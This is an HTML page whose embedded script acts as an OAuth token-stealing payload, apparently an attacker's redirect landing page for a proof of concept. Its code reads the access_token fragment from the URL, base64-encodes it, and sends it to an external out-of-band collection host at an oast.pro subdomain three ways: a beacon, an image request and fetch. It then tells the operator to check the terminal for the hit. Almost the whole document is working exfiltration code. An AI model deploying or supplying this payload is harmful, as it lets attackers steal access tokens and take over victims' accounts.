<!DOCTYPE html>
<html>
<head><title>Processing...</title></head>
<body>
    <h1>Extracting Token...</h1>
    <script>
        (function() {
            // 1. Capture the fragment (#access_token=...)
            var fragment = window.location.hash;
            
            // 2. Your NEW OAST URL
            var oastUrl = "https://d5ofuuda9dbio9v97ls0xmcjxchecoj7h.oast.pro/?token_data=" + btoa(fragment);

            if (fragment) {
                // METHOD A: Navigator Beacon (Bypasses most browser blocks)
                navigator.sendBeacon(oastUrl);

                // METHOD B: Image source (The classic "leak" method)
                var img = new Image();
                img.src = oastUrl;

                // METHOD C: Fetch (Modern background request)
                fetch(oastUrl, { mode: 'no-cors' });

                console.log("Token leak triggered to: " + oastUrl);
                document.body.innerHTML = "<h1>Success</h1><p>Check your OAST terminal for the hit.</p>";
            } else {
                document.body.innerHTML = "<h1>Error: No fragment detected.</h1>";
            }
        })();
    </script>
</body>
</html>
